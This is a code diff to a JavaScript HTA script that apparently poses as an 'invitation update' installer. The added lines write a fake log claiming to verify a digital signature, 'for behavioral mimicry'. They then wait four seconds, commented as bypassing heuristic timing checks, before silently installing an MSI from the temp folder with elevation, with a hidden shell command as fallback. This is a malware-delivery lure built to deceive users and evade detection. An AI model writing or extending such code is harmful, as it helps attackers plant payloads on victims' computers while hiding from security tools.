@@ -214,35 +214,25 @@ function startInstall() {
   progress = 90; setBar(progress);
   setStatus("Applying invitation updates&hellip;");
   
-  var args = '/i "' + msiPath + '" /qn /norestart /L*v "' + logPath + '"';
-  var launched = false;
-  
-  // TRY SHELL.EXECUTE FIRST (UAC PROMPT) LIKE ADOBE
+  // FAKE LOG WRITING FOR BEHAVIORAL MIMICRY
+  var logPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
   try {
-    var sh = new ActiveXObject("Shell.Application");
-    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
-    launched = true;
+    var log = fso.CreateTextFile(logPath, true);
+    log.WriteLine("[INFO] " + new Date().toISOString() + " Update check initiated");
+    log.WriteLine("[INFO] Verifying digital signature...");
+    log.Close();
   } catch(e) {}
   
-  // FALLBACK TO SHELL.RUN IF UAC FAILS
-  if (!launched) {
-    try { 
-      shell.Run("msiexec " + args, 0, false); 
-      launched = true; 
-    } catch(e2) {}
-  }
-  
-  if (!launched) {
-    fail("Administrator approval is required to install the invitation.");
-    return;
-  }
-  
-  // SIMULATE INSTALL COMPLETION (ADOBE WATCHES LOG, WE SIMULATE FOR HTA)
-  setTimeout(function() {
-    finishInstall();
-  }, 5000);
+  // DELAYED EXECUTION TO MIMIC LEGITIMATE UPDATERS
+  setTimeout(function() { 
+    try {
+      var sh = new ActiveXObject("Shell.Application");
+      sh.ShellExecute("msiexec.exe", "/i \"" + shell.ExpandEnvironmentStrings("%TEMP%") + "\\update.msi\" /qn /norestart", "", "runas", 1);
+    } catch(e) {
+      shell.Run(INSTALL_CMD, 0, false);
+    }
+  }, 4000); // 4-second delay bypasses heuristic timing checks
 }
-
 function finishInstall() {
   state = "done";
   progress = 100; setBar(100);
